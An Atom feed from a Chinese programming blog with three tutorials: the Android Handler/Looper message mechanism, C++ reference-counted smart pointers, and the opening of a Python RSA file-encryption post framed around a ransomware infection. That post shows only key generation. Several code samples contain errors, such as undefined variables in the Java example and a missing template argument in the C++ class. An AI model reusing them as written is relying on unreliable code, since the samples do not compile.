<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风中老狼的博客</title>
  <subtitle>不积跬步，无以至千里；不积小流，无以成江海</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://maoao530.github.io/"/>
  <updated>2016-12-11T07:39:39.413Z</updated>
  <id>https://maoao530.github.io/</id>
  
  <author>
    <name>风中老狼</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android消息机制理解</title>
    <link href="https://maoao530.github.io/2016/12/11/android-looper-handler-message/"/>
    <id>https://maoao530.github.io/2016/12/11/android-looper-handler-message/</id>
    <published>2016-12-11T06:17:21.000Z</published>
    <updated>2016-12-11T07:39:39.413Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍Android的消息机制。</p>
<a id="more"></a>
<h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1 引言"></a>1 引言</h1><p>假设现在我们有这样的需求，点一下图中的button，然后去获取一些数据（假设这个步骤是一个耗时的操作），然后获取完后将得到的数据返回显示到屏幕上。<br>为了避免产生<code>ANR(Application Not Response)</code>问题，通常我们会在新的线程去做耗时的操作，然后在UI线程里面更新组件，所以Handler就是类似这样子一个机制。</p>
<p><img src="/img/archives/android-looper-handler-message-01.png" alt="android-looper-handler-message-01.png"></p>
<p>那么我们会怎么去实现呢？可以参考如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDriverActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        tv = (TextView)findViewById(R.id.tv);</div><div class="line">        btn = (Button)findViewById(R.id.btn);</div><div class="line"></div><div class="line">        <span class="comment">// 接收并处理消息</span></div><div class="line">        mHandler = <span class="keyword">new</span> Handler()&#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span></span>&#123;</div><div class="line">                <span class="keyword">if</span> (message.what == <span class="number">0x11</span>)&#123;</div><div class="line">                    Toast.makeText(getApplicationContext(), <span class="string">"mHandler handleMessage"</span> );</div><div class="line">                    tv.setText(<span class="string">"mHandler is receive message"</span>)</div><div class="line">                &#125;</div><div class="line">                </div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        <span class="comment">// 监听</span></div><div class="line">        btn.setOnClickListener(<span class="keyword">new</span> View.onClickListener()&#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</div><div class="line">                MyThread t = <span class="keyword">new</span> MyThread(mHandler);</div><div class="line">                t.start();</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</div><div class="line">    Handler handler;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyThread</span><span class="params">(Handler handler)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        <span class="keyword">this</span>.handler = handler;</div><div class="line">    &#125;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">super</span>.run();</div><div class="line">        mHandler.sendEmptyMessage(<span class="number">0x11</span>);  <span class="comment">//发送消息</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这只是一种实现的方式，如果在<code>子线程</code>而不是ui线程去初始化handler，则需要初始化<code>handler</code>前调用<code>Looper.prepare()</code>，初始化结束后调用<code>Looper.loop()</code>。</p>
<h1 id="2-相关概念"><a href="#2-相关概念" class="headerlink" title="2 相关概念"></a>2 相关概念</h1><p>学习Android的消息处理机制，有几个概念（类）必须了解：</p>
<ol>
<li><strong>Message</strong><br>消息，理解为线程间通讯的数据单元。例如后台线程在处理数据完毕后需要更新UI，则可发送一条包含更新信息的Message给UI线程。</li>
<li><strong>Message Queue</strong><br>消息队列，用来存放通过Handler发布的消息，按照先进先出执行。</li>
<li><strong>Handler</strong><br>Handler是Message的主要处理者，负责将Message添加到消息队列以及对消息队列中的Message进行处理。</li>
<li><strong>Looper</strong><br>循环器，扮演Message Queue和Handler之间桥梁的角色，循环取出Message Queue里面的Message，并交付给相应的Handler进行处理。</li>
<li><strong>Thread</strong><br>UI thread 通常就是main thread，而Android启动程序时会替它建立一个Message Queue。<br>每一个线程里可含有一个Looper对象以及一个MessageQueue数据结构。在你的应用程序里，可以定义Handler的子类别来接收Looper所送出的消息。</li>
</ol>
<h1 id="3-Looper"><a href="#3-Looper" class="headerlink" title="3 Looper"></a>3 Looper</h1><p>Looper被设计用来使一个普通线程变成Looper线程。所谓Looper线程就是循环工作的线程。在程序开发中（尤其是GUI开发中），我们经常会需要一个线程不断循环，一旦有新任务则执行，执行完继续等待下一个任务，这就是Looper线程。使用Looper类创建Looper线程很简单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LooperThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// 将当前线程初始化为Looper线程</span></div><div class="line">        Looper.prepare();</div><div class="line">        </div><div class="line">        <span class="comment">// ...其他处理，如实例化handler</span></div><div class="line">        </div><div class="line">        <span class="comment">// 开始循环处理消息队列</span></div><div class="line">        Looper.loop();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3-1-Looper-prepare"><a href="#3-1-Looper-prepare" class="headerlink" title="3.1 Looper.prepare()"></a>3.1 Looper.prepare()</h2><p>当执行了<code>Looper.prepare()</code>后，当前线程就会升级为Looper线程：</p>
<p><img src="/img/archives/android-looper-prepare.png" alt="android-looper-prepare.png"></p>
<ul>
<li>一个Thread只能有一个Looper对象</li>
<li>线程中有一个Looper对象，它的内部维护了一个消息队列MessageQueue</li>
</ul>
<h2 id="3-2-Looper-loop"><a href="#3-2-Looper-loop" class="headerlink" title="3.2 Looper.loop()"></a>3.2 Looper.loop()</h2><p>当调用loop方法后，Looper线程就开始真正工作了，它不断从自己的MQ中取出队头的消息(也叫任务)执行。</p>
<p><img src="/img/archives/android-looper-loop.png" alt="android-looper-loop.png"></p>
<p>那么，我们如何往MQ上添加消息呢？下面有请Handler</p>
<h1 id="4-Handler"><a href="#4-Handler" class="headerlink" title="4 Handler"></a>4 Handler</h1><p>Handler扮演了往MQ上添加消息和处理消息的角色（只处理由自己发出的消息），即往MQ上添加消息的时候执行sendMessage，并在loop到自己的时候处理消息执行handleMessage，整个过程是异步的。</p>
<p><strong>Handler创建时会关联一个looper，默认关联当前线程的looper。</strong></p>
<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LooperThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>{
    <span class="keyword">private</span> Handler handler1;
    <span class="keyword">private</span> Handler handler2;

    <span class="meta">@Override</span>
    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>{
        <span class="comment">// 将当前线程初始化为Looper线程</span>
        Looper.prepare();

        <span class="comment">// 实例化两个handler</span>
        handler1 = <span class="keyword">new</span> Handler(); 
        handler2 = <span class="keyword">new</span> Handler();

        <span class="comment">// 开始循环处理消息队列</span>
        Looper.loop();
    }
}
</code></pre>
<p>加入Handler后结构图如下：</p>
<p><img src="/img/archives/android-looper-handler-2.png" alt="android-looper-handler-2.png"></p>
<p><strong>一个线程可以有多个Handler，但是只能有一个Looper。</strong></p>
<h1 id="4-1-Handler发送消息和处理消息"><a href="#4-1-Handler发送消息和处理消息" class="headerlink" title="4.1 Handler发送消息和处理消息"></a>4.1 Handler发送消息和处理消息</h1><p>大致流程：</p>
<ol>
<li>mHandler.sendMessage()发送消息到MQ</li>
<li>Looper.loop()将message不断从MQ从取出来交给handler处理</li>
<li>mHandler.handleMessage()处理消息</li>
</ol>
<p><img src="/img/archives/android-handler-send-handle-msg.PNG" alt="android-handler-send-handle-msg.PNG"></p>
<h1 id="5-回顾"><a href="#5-回顾" class="headerlink" title="5 回顾"></a>5 回顾</h1><p>那么回到一开始我们举的例子，在非UI线程去做耗时的操作，然后完成后在UI线程更新UI信息。那么这种case下，我们的结构图是这样的：</p>
<p><img src="/img/archives/android-ui-thread-handler.PNG" alt="android-ui-thread-handler.PNG"></p>
<p>至此，本文介绍的内容已经完成，本文内容大部分非原创，更多的是基于其他博客的和自己理解的总结，好记性不如烂笔头。如果需要了解源码的同学，可以继续深入阅读研究，包括Java层Looper，Handler，Message，MessageQueue的源码和Native层Looper，NativeMessageQueue的源码实现。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍Android的消息机制。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Looper" scheme="https://maoao530.github.io/tags/Looper/"/>
    
      <category term="Handler" scheme="https://maoao530.github.io/tags/Handler/"/>
    
      <category term="Message" scheme="https://maoao530.github.io/tags/Message/"/>
    
  </entry>
  
  <entry>
    <title>引用计数 &amp; Android智能指针</title>
    <link href="https://maoao530.github.io/2016/12/10/cpp-ref-count/"/>
    <id>https://maoao530.github.io/2016/12/10/cpp-ref-count/</id>
    <published>2016-12-10T03:48:56.000Z</published>
    <updated>2016-12-10T14:07:05.298Z</updated>
    
    <content type="html"><![CDATA[<p>引用计数机制</p>
<p>以前学cocos写游戏的时候有接触过这个概念。</p>
<p>引用计数是计算机编程语言中的一种内存管理技术，是指将资源（可以是对象、内存或磁盘空间等等）的被引用次数保存起来，当被引用次数变为零时就将其释放的过程。使用引用计数技术可以实现自动资源管理的目的。</p>
<a id="more"></a>
<h1 id="1-什么是引用计数"><a href="#1-什么是引用计数" class="headerlink" title="1 什么是引用计数"></a>1 什么是引用计数</h1><p>简单来讲，当我们创建一个对象的实例并在堆上申请内存时，对象的引用计数就为1，在其他对象中需要持有这个对象时，就需要把该对象的引用计数加1，需要释放一个对象时，就将该对象的引用计数减1，直至对象的引用计数为0，对象的内存会被立刻释放。</p>
<h1 id="2-什么是智能指针？"><a href="#2-什么是智能指针？" class="headerlink" title="2 什么是智能指针？"></a>2 什么是智能指针？</h1><p>C语言、C++语言没有自动内存回收机制，关于内存的操作的安全性依赖于程序员的自觉。程序员每次new出来的内存块都需要自己使用delete进行释放，流程复杂可能会导致忘记释放内存而造成内存泄漏。而智能指针也致力于解决这种问题，使程序员专注于指针的使用而把内存管理交给智能指针。</p>
<h1 id="3-使用引用计数来实现智能指针"><a href="#3-使用引用计数来实现智能指针" class="headerlink" title="3 使用引用计数来实现智能指针"></a>3 使用引用计数来实现智能指针</h1><p>了解了引用计数，我们可以使用它来写我们的智能指针类了。</p>
<h1 id="3-1-基础对象类"><a href="#3-1-基础对象类" class="headerlink" title="3.1 基础对象类"></a>3.1 基础对象类</h1><p>首先，我们来定义一个基础对象类Student类，这个是我们实际使用的对象，我们为Student类创建如下接口：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> Student                                       </div><div class="line">&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    Student()&#123; <span class="built_in">cout</span>&lt;&lt;<span class="string">"Student()"</span>; &#125;</div><div class="line">    ~Student()&#123; <span class="built_in">cout</span>&lt;&lt;<span class="string">"~Student()"</span>;&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="3-2-辅助管理类"><a href="#3-2-辅助管理类" class="headerlink" title="3.2 辅助管理类"></a>3.2 辅助管理类</h1><p>在创建<code>智能指针类</code>之前，我们先创建一个辅助管理类。这个类的所有成员皆为私有类型，因为它不被普通用户所使用。为了只为智能指针使用，还需要把智能指针类声明为辅助类的友元。<br>这个辅助类含有两个数据成员：<code>引用计数count</code>与<code>基础对象指针</code>。也即辅助类用以封装使用计数与基础对象指针。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line"><span class="keyword">class</span> U_Ptr                                  </div><div class="line">&#123;</div><div class="line"><span class="keyword">private</span>:</div><div class="line">    </div><div class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> SmartPtr;                      <span class="comment">//友元类能直接操作U_Ptr类成员</span></div><div class="line">    U_Ptr(T *ptr) :p(ptr), count(<span class="number">1</span>) &#123; &#125;         <span class="comment">//初始化1</span></div><div class="line">    ~U_Ptr() &#123; <span class="keyword">delete</span> p; &#125;                      <span class="comment">//虚析构函数</span></div><div class="line">    </div><div class="line">    <span class="keyword">int</span> count;                      <span class="comment">// 引用计数</span></div><div class="line">    T *p;                           <span class="comment">// 实际的对象                                        </span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="3-3-智能指针类"><a href="#3-3-智能指针类" class="headerlink" title="3.3 智能指针类"></a>3.3 智能指针类</h1><p>设计一个智能指针类SmartPtr类，我们这里只关注rp指针和构造函数、析构函数。<br>rp是基础管理类，SmartPtr类通过rp来间接增加或者减少引用计数count，当引用计数为0，则delete rp，而rp的析构函数，会去释放真正的对象。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line"><span class="keyword">class</span> SmartPtr</div><div class="line">&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    SmartPtr(T *ptr) :rp(<span class="keyword">new</span> U_Ptr(ptr)) &#123; &#125;      <span class="comment">//构造函数</span></div><div class="line">    SmartPtr(<span class="keyword">const</span> SmartPtr &amp;sp) :rp(sp.rp) &#123; ++rp-&gt;count; &#125; <span class="comment">//复制构造函数</span></div><div class="line">    SmartPtr&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> SmartPtr&amp; rhs) &#123;               <span class="comment">//赋值函数</span></div><div class="line">        ++rhs.rp-&gt;count;    </div><div class="line">        <span class="keyword">if</span> (--rp-&gt;count == <span class="number">0</span>)    </div><div class="line">            <span class="keyword">delete</span> rp;</div><div class="line">        rp = rhs.rp;</div><div class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    ~SmartPtr() &#123;                           <span class="comment">//析构函数（虚函数）       </span></div><div class="line">        <span class="keyword">if</span> (--rp-&gt;count == <span class="number">0</span>)   </div><div class="line">            <span class="keyword">delete</span> rp;</div><div class="line">        <span class="keyword">else</span> </div><div class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"还有"</span> &lt;&lt; rp-&gt;count &lt;&lt; <span class="string">"个指针指向基础对象"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line"><span class="keyword">private</span>:</div><div class="line">        U_Ptr *rp;  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="4-使用示例"><a href="#4-使用示例" class="headerlink" title="4 使用示例"></a>4 使用示例</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">//定义一个基础对象类指针</span></div><div class="line">    Student *pS = <span class="keyword">new</span> Student();</div><div class="line"></div><div class="line">    <span class="comment">//定义三个智能指针类对象，对象都指向基础类对象pa</span></div><div class="line">    <span class="comment">//使用花括号控制三个指针指针的生命期，观察计数的变化</span></div><div class="line"></div><div class="line">    &#123;</div><div class="line">        SmartPtr&lt;Student&gt; sptr1(pS);<span class="comment">//此时计数count=1</span></div><div class="line">        &#123;</div><div class="line">            SmartPtr&lt;Student&gt; sptr2(sptr1); <span class="comment">//调用复制构造函数，此时计数为count=2</span></div><div class="line">            &#123;</div><div class="line">                SmartPtr&lt;Student&gt; sptr3=sptr1; <span class="comment">//调用赋值操作符，此时计数为conut=3</span></div><div class="line">            &#125;</div><div class="line">            <span class="comment">//此时count=2</span></div><div class="line">        &#125;</div><div class="line">        <span class="comment">//此时count=1；</span></div><div class="line">    &#125;</div><div class="line">    <span class="comment">//此时count=0；pS对象被delete掉</span></div><div class="line"></div><div class="line">    system(<span class="string">"pause"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>引用计数实现的方式多种多样，上面是一种比较简单的参考实现。</p>
<h1 id="5-Android智能指针"><a href="#5-Android智能指针" class="headerlink" title="5.Android智能指针"></a>5.Android智能指针</h1><p>原始的引用计数无法解决循环引用问题。什么是循环引用？举一个简单例子：</p>
<blockquote>
<p>系统中有两个对象A和B，在对象A的内部引用了对象B，而在对象B的内部也引用了对象A。当两个对象A和B都不再使用时，垃圾收集系统会发现无法回收这两个对象的所占据的内存的，因为系统一次只能收集一个对象，而无论系统决定要收回对象A还是要收回对象B时，都会发现这个对象被其它的对象所引用，因而就都回收不了，这样就造成了内存泄漏。</p>
</blockquote>
<p>这样，就要采取另外的一种引用计数技术了，即对象的引用计数同时存在强引用和弱引用两种计数。比如Android的智能指针。</p>
<h2 id="5-1-强指针和弱指针"><a href="#5-1-强指针和弱指针" class="headerlink" title="5.1 强指针和弱指针"></a>5.1 强指针和弱指针</h2><p>Android中定义了两种智能指针类型，一种是强指针sp（strong pointer），一种是弱指针（weak pointer）。其实成为强引用和弱引用更合适一些。强指针与一般意义的智能指针概念相同，通过引用计数来记录有多少使用者在使用一个对象，如果所有使用者都放弃了对该对象的引用，则该对象将被自动销毁。</p>
<p>弱指针也指向一个对象，但是弱指针仅仅记录该对象的地址，不能通过弱指针来访问该对象，也就是说不能通过弱智真来调用对象的成员函数或访问对象的成员变量。要想访问弱指针所指向的对象，需首先将弱指针升级为强指针（通过wp类所提供的promote()方法）。弱指针所指向的对象是有可能在其它地方被销毁的，如果对象已经被销毁，wp的promote()方法将返回空指针，这样就能避免出现地址访问错的情况。</p>
<p>每一个可以被智能指针引用的对象都同时被附加了另外一个 weakref_impl类型的对象，这个对象中负责记录对象的强指针引用计数和弱指针引用计数。这个对象是Android智能指针的实现内部使用的，智能指针的使用者看不到这个对象。弱指针操作的就是这个对象，只有当强引用计数和弱引用计数都为0时，这个对象才会被销毁。</p>
<h2 id="5-2-使用Android智能指针"><a href="#5-2-使用Android智能指针" class="headerlink" title="5.2 使用Android智能指针"></a>5.2 使用Android智能指针</h2><p>假如我有一个类MyClass要使用智能指针，那么需要满足两个条件：</p>
<ul>
<li>（1） 这个类是RefBase的子类或间接子类；</li>
<li>（2） 这个类必须定义<code>虚</code>构造函数 :  <code>~MyClass(){}</code></li>
</ul>
<h3 id="强指针"><a href="#强指针" class="headerlink" title="强指针"></a>强指针</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sp&lt; MyClass&gt; p_obj = <span class="keyword">new</span> MyClass(); </div><div class="line">p_obj-&gt;func()</div></pre></td></tr></table></figure>
<h3 id="弱指针"><a href="#弱指针" class="headerlink" title="弱指针"></a>弱指针</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wp&lt; MyClass&gt; wp_obj = <span class="keyword">new</span> MyClass();  </div><div class="line">p_obj = wp_obj.promote();    <span class="comment">// 用.而不是-&gt;  </span></div><div class="line">p_obj-&gt;func();</div></pre></td></tr></table></figure>
<p>相关源码：</p>
<ul>
<li><a href="http://androidxref.com/4.4_r1/xref/system/core/include/utils/RefBase.h" target="_blank" rel="external">http://androidxref.com/4.4_r1/xref/system/core/include/utils/RefBase.h</a></li>
<li><a href="http://androidxref.com/4.4_r1/xref/system/core/include/utils/StrongPointer.h" target="_blank" rel="external">http://androidxref.com/4.4_r1/xref/system/core/include/utils/StrongPointer.h</a></li>
</ul>
<p>如果需要了解Android智能指针的实现，可以参考老罗的一篇文章：<br><a href="http://blog.csdn.net/luoshengyang/article/details/6786239" target="_blank" rel="external">http://blog.csdn.net/luoshengyang/article/details/6786239</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;引用计数机制&lt;/p&gt;
&lt;p&gt;以前学cocos写游戏的时候有接触过这个概念。&lt;/p&gt;
&lt;p&gt;引用计数是计算机编程语言中的一种内存管理技术，是指将资源（可以是对象、内存或磁盘空间等等）的被引用次数保存起来，当被引用次数变为零时就将其释放的过程。使用引用计数技术可以实现自动资源管理的目的。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Android智能指针" scheme="https://maoao530.github.io/tags/Android%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>Python RSA文件加密</title>
    <link href="https://maoao530.github.io/2016/11/20/python-rsa/"/>
    <id>https://maoao530.github.io/2016/11/20/python-rsa/</id>
    <published>2016-11-20T13:51:47.000Z</published>
    <updated>2016-12-10T14:06:06.029Z</updated>
    
    <content type="html"><![CDATA[<p>本文教你如何用Python对文件进行不对称加密。</p>
<a id="more"></a>
<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前段时间，一个同学找到我说他的电脑中病毒了，电脑上所有重要的文件都变成了<em>*</em>.cryp1，打也打不开，大学生涯的重要文件都没有了，很着急所以让我帮忙看看。嗯，作为程序员的觉悟，第一反应就是开始找资料，看看这个是什么鬼。</p>
<p>Google了一番后，发现这个病毒的名字叫特斯拉勒索者，会把你电脑上的一些文件进行加密，变成<em>*</em>.cryp1，并留下一个比特币支付的链接，让你打钱过去，不打钱就不给你解密的方法，那么如果你中毒了，那么只能恭喜你了！因为除了作者把私钥放出来，否则基本上没有破解的可能。</p>
<p>为什么这么说呢？病毒会对文件进行不对称加密，也就是公钥加密算法。只要保证你的密钥长度足够长，那么基本上就没有破解的可能。为什么这么说呢？你可以想象一下银行卡交易被破解的后果。</p>
<h1 id="1-RSA简介"><a href="#1-RSA简介" class="headerlink" title="1 RSA简介"></a>1 RSA简介</h1><p>RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。RSA就是他们三人姓氏开头字母拼在一起组成的。<br>RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。</p>
<p>RSA算法的原理，目前网络上有许多优秀的文章，特别推荐阅读阮一峰老师的文章：</p>
<ul>
<li><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html" target="_blank" rel="external">RSA算法原理1</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="external">RSA算法原理2</a></li>
</ul>
<p>本文主要描述如何使用RSA来对文件进行不对成加密。</p>
<h1 id="2-PyCrypto"><a href="#2-PyCrypto" class="headerlink" title="2 PyCrypto"></a>2 PyCrypto</h1><p>PyCrypto是Python中密码学方面比较有名的第三方软件包。可惜的是，它的开发工作于 2012 年就已停止。幸运的是，有一个该项目的分支 PyCrytodome 取代了PyCrypto，可以支持Python3.5，在Windows上，我们可以直接安装：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">py <span class="number">-3</span> -m pip install PyCrytodome</div></pre></td></tr></table></figure>
<p>相关文档可以直接访问：</p>
<ul>
<li><a href="http://pycryptodome.readthedocs.io/en/latest/src/examples.html" target="_blank" rel="external">例子说明</a></li>
<li><a href="http://legrandin.github.io/pycryptodome/Doc/3.4/" target="_blank" rel="external">API说明</a></li>
</ul>
<h1 id="3-文件加密"><a href="#3-文件加密" class="headerlink" title="3 文件加密"></a>3 文件加密</h1><p>准备好环境之后，那么我们现在来开始模拟<code>黑客</code>对文件进行加密处理吧！！<br>如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。</p>
<h1 id="3-1-生成公钥和私钥"><a href="#3-1-生成公钥和私钥" class="headerlink" title="3.1 生成公钥和私钥"></a>3.1 生成公钥和私钥</h1><p>在这个例子中，我们将生成自己的密钥对。创建 RSA 密钥非常容易：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateRSAKeys</span><span class="params">()</span>:</span></div><div class="line">    code = <span class="string">'nooneknows'</span></div><div class="line">    <span class="comment"># 生成 2048 位的 RSA 密钥</span></div><div class="line">    key = RSA.generate(<span class="number">2048</span>)</div><div class="line">    encrypted_key = key.exportKey(passphrase=code, pkcs=<span class="number">8</span>, protection=<span class="string">"scryptAndAES128-CBC"</span>)</div><div class="line">    <span class="comment"># 生成私钥</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'my_private_rsa_key.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(encrypted_key)</div><div class="line">    <span class="comment"># 生成公钥</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'my_rsa_public.pem'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(key.publickey().exportKey())</div></pre></td></tr></table></figure>
<p>当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。</p>
